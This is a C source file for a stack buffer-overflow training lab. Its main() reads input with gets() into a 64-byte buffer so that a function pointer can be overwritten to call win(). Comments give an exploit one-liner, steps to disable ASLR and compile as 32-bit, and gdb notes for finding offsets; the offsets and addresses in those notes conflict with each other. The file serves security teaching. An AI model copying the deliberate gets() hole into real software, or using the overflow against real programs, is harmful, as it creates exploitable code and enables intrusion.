
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

/* NOTE THIS ONLY WORKS WITH DISABLE ASR AND 32 COMPILATION!!!
 * 
1) Install 32 bit capabilties for gcc:
sudo apt-get install gcc-multilib
2) Compile it for 32bit (-m32)
gcc -m32 stackThree.c -o stackThree
3) Run a bash with asr disabled
setarch `uname -m` -R /bin/bash
4) Try the exploit again. Eg.:
python -c 'print "A"*64 + "565561e4".decode("hex")'[::-1]  | ./stackThree
 * 
 * Solution Approach:
 * 1) find win functions address (gdb: disassamble win)
 *      (gdb) disassemble win
        Dump of assembler code for function win:
        0x0000555555555155 <+0>:	push   rbp 
           -> 555555555155 is our target content
           -> since we can pass only keyboard out put to gets we need to pass the correct representive of this value as ascii:
               python: "555555555155".decode("hex") 
           -> since we are on a different endian system we need to print the address reverse:
               python: "555555555155".decode("hex")'[::-1]

 * 2) find fp location
 *     -> fp is at:    0x0000555555555190 <+40>:	cmp    QWORD PTR [x rbp-0x8],0x0 ($rbp-0x8) -> 0x7fffffffe0f8

 * 3) override it with address of win function
 *    -> buffer starts at 0x000055555555517f <+23>:	lea    rax,[rbp-0x50] ($rbp-0x50)         -> 0x7fffffffe0b0
 *                                                                                            -> Diff to 2): 72 Byte
 * */
int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];
  printf("win: %p\n", &win);
  fp = 0;
  gets(buffer);
  if(fp) {
      printf("calling function pointer, jumping to 0x%8x\n", fp);
      fp();
  }
}
